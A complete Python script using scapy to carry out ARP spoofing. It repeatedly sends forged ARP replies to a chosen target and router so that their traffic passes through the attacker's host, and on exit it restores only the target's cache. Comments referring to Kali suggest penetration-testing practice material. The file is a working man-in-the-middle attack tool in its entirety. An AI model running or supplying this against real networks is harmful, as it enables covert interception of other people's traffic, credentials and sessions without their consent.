#!/usr/bin/env python
import sys
import time
import scapy.all as scapy
import optparse

def get_args():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="target",help="Target IP")
    parser.add_option("-r","--router",dest="router",help="Router's IP")
    option,arg=parser.parse_args()
    if not option.target or not option.router:
        parser.error("[-]Please specify a target , use --help for more info.")
    return option

def get_MAC(ip):
    # scapy.arping(ip)

    arp_request = scapy.ARP(pdst=ip)  # ARP request
    # arp_request.pdst=ip

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Braodcast the request

    arp_request_broadcast = broadcast / arp_request  # Combination of 2 packet

    answered, unanswered = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)  ##gives back 2 values(LIST)
    return answered[0][1].hwsrc

def spoof(target_IP,Router_IP):

    # (op=2) RESPONSE
    # pdst ==> Target IP
    # hwdst ==> Target MAC
    # psrc ==> Router IP
    target_MAC = get_MAC(target_IP)
    packet=scapy.ARP(op=2,pdst =target_IP,hwdst=target_MAC,psrc=Router_IP)
    #Check the package
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)

def restore(target_IP,Router_IP):
    target_MAC = get_MAC(target_IP)
    Router_MAC = get_MAC(Router_IP)
    packet = scapy.ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=Router_IP, hwsrc=Router_MAC) # If we dont set hwsrc it will be set to kali's mac address
    scapy.send(packet,verbose=False)


option=get_args()

num_packet=0
try:
    while True:
        spoof(option.target,option.router)
        spoof(option.router,option.target)
        num_packet += 2
        print(f"\r[+]SENT {num_packet} packets",end="") #DYNAMIIC PRINTING
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected Ctrl+C .... Quitting.")
    restore(option.target,option.router)


